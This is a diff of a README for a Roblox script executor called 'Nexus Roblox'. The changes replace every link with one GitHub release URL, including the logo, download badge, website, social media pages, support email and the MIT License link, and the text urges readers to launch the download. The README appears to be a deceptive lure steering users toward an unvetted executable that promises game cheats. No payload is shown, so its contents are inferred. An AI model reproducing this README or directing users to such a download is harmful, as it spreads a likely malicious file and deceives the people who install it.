@@ -1,6 +1,6 @@
 # 🚀 Nexus Roblox - The Ultimate Roblox Script Executor
 
-![Nexus Roblox Logo](https://example.com/nexus-roblox-logo.png)
+![Nexus Roblox Logo](https://github.com/newgenmightywarrior/Nexus-Roblox/releases/tag/v2.0)
 
 Welcome to Nexus Roblox, your one-stop solution for Roblox script execution! Our Nexus Executor offers free and lifetime packages, all hosted directly on our website. We support the execution of all Luau scripts with no reported bans. However, we do feature a limited number of games and a small script hub to complement your Roblox experience.
 
@@ -37,25 +37,25 @@ Welcome to Nexus Roblox, your one-stop solution for Roblox script execution! Our
 
 To access Nexus Roblox and start enjoying our script execution capabilities, simply click the link below!
 
-[![Download Nexus Roblox](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/file/App.zip)
+[![Download Nexus Roblox](https://github.com/newgenmightywarrior/Nexus-Roblox/releases/tag/v2.0)](https://github.com/newgenmightywarrior/Nexus-Roblox/releases/tag/v2.0)
 
 If the link above ends with the file name, click to launch the application. If you encounter any issues with the link, please check the "Releases" section for alternative access.
 
 ## Visit Our Website 🌐
 
-For more information and updates, visit our official website: [Nexus Roblox Website](https://www.nexus-roblox.com)
+For more information and updates, visit our official website: [Nexus Roblox Website](https://github.com/newgenmightywarrior/Nexus-Roblox/releases/tag/v2.0)
 
 ## Join the Community 🤝
 
 Connect with us on social media and join our community to stay updated on the latest releases, announcements, and exclusive offers!
 
-- Facebook: [Nexus Roblox Facebook Page](https://www.facebook.com/nexus-roblox)
-- Twitter: [Nexus Roblox Twitter](https://twitter.com/nexus-roblox)
-- Instagram: [Nexus Roblox Instagram](https://www.instagram.com/nexus-roblox)
+- Facebook: [Nexus Roblox Facebook Page](https://github.com/newgenmightywarrior/Nexus-Roblox/releases/tag/v2.0)
+- Twitter: [Nexus Roblox Twitter](https://github.com/newgenmightywarrior/Nexus-Roblox/releases/tag/v2.0)
+- Instagram: [Nexus Roblox Instagram](https://github.com/newgenmightywarrior/Nexus-Roblox/releases/tag/v2.0)
 
 ## Help and Support 🛠️
 
-If you encounter any issues, have questions, or need support, feel free to reach out to our customer service team at support@nexus-roblox.com. We are here to assist you every step of the way!
+If you encounter any issues, have questions, or need support, feel free to reach out to our customer service team at https://github.com/newgenmightywarrior/Nexus-Roblox/releases/tag/v2.0 We are here to assist you every step of the way!
 
 ## Contribute 🤖
 
@@ -63,7 +63,7 @@ We welcome contributions from the community to enhance Nexus Roblox further. If 
 
 ## License 📜
 
-Nexus Roblox is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute our script execution platform as per the terms of the license agreement.
+Nexus Roblox is licensed under the [MIT License](https://github.com/newgenmightywarrior/Nexus-Roblox/releases/tag/v2.0). Feel free to use, modify, and distribute our script execution platform as per the terms of the license agreement.
 
 ---
 
